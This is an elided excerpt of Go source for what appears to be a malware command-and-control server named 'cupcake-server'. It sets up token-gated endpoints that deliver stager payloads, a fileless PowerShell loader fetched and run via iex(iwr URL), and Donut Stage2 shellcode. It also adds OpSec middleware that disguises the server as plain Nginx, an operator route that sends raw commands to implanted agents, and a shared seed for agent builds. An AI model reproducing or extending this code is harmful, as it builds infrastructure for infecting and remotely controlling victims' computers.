...
import (
	...
	"cupcake-server/internal/controller"
	"cupcake-server/internal/config"
...
func main() {
	...
	store.InitDB()
	// Wire seed priority: env → config.json → DB setting → generate once.
	// Must match agent Builder (CUPCAKE_WIRE_SEED). Never use public "wire-v1-default-2026".
	wireSeed := resolveAndPersistWireSeed(cfg)
	...
	// OpSec Middleware: consistent edge fingerprint (Nginx only — no PHP X-Powered-By).
	...
	// Public stager delivery: rate-limited + hit-capped + short-lived HMAC token (?t=)
	stagerPublic := []gin.HandlerFunc{
		stagerguard.RateLimitMiddleware(),
		stagerguard.TokenMiddleware(),
	}
	adminRouter.GET("/api/s/bin/:id", append(stagerPublic, controllers.HandleServeRawPayload)...)
	adminRouter.GET("/api/s/:id", append(stagerPublic, controllers.HandleServePayload)...)
	// Fileless loader script — short one-click PS via iex(iwr URL); returns Stage2 loader body
	adminRouter.GET("/api/s/l/:id", append(stagerPublic, controllers.HandleServeFilelessLoader)...)
	// Fileless Stage2 PIC (Donut) — short-TTL cache from /api/stager?delivery=fileless
	adminRouter.GET("/api/stage2/:id", append(stagerPublic, controllers.HandleServeStage2)...)
	adminRouter.GET("/api/s/stage2/:id", append(stagerPublic, controllers.HandleServeStage2)...)
	...
	api := adminRouter.Group("/api")
	{
		...
		// --- operator: raw command dispatch (test/automation surface) ---
		api.POST("/cmd_raw", middleware.RequireOperator(), func(c *gin.Context) {
			var req struct {
				UUID    string `json:"uuid"`
				CmdType string `json:"command_type"`
				Content string `json:"content"`
			}
			if err := c.ShouldBindJSON(&req); err != nil || req.UUID == "" || req.CmdType == "" {
				c.JSON(400, gin.H{"error": "uuid and command_type required"})
				return
			}
			if err := services.SendAgentCommandWithRetry(req.UUID, req.CmdType, req.Content, false, "operator"); err != nil {
...
modules.POST("/push", middleware.RequireAdmin(), controllers.HandlePushModule)
	...
	distFS, _ := fs.Sub(cupcakeserver.WebDist, "web/dist")
...
// resolveAndPersistWireSeed returns a deployment-unique seed and persists it to
// settings + config.json so restarts and agent Builder always share the same value.
func resolveAndPersistWireSeed(cfg *config.ServerConfig) string {
	const retired = "wire-v1-default-2026"
	wireSeed := strings.TrimSpace(os.Getenv("CUPCAKE_WIRE_SEED"))
	if wireSeed == "" && cfg != nil {
		wireSeed = strings.TrimSpace(cfg.WireSeed)
	}
	if wireSeed == "" {
		wireSeed = strings.TrimSpace(store.GetSetting("wire_seed"))
	}
	if wireSeed == "" || wireSeed == retired {
		wireSeed = utils.GenerateWireSeed()
		fmt.Printf("\x1b[33m[!]\x1b[0m Generated wire seed (save for agent builds): %s\n", wireSeed)
	}
	_ = store.SetSetting("wire_seed", wireSeed, "crypto")
	if cfg != nil && strings.TrimSpace(cfg.WireSeed) != wireSeed {
		cfg.WireSeed = wireSeed
		if err := config.SaveConfig(cfg); err != nil {
			log.Printf("[wire] warn: could not persist wire_seed to config.json: %v", err)
		}
	}
	return wireSeed
}
